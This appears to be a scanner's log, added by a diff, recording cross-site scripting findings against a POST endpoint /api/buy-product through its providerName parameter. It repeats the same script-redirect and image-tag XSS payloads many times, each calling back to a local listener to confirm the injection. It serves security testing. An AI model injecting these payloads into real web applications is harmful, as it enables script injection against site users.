@@ -1,0 +1,205 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <img src='https://127.0.0.1:4446/xss/api/buy-productLLMproviderName'>
+
+API Vul Type: xss
+Vul API Url: /api/buy-product
+Vul API Method: Post
+API Vul Param: providerName
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/api/buy-productLLMproviderName'</script>
+
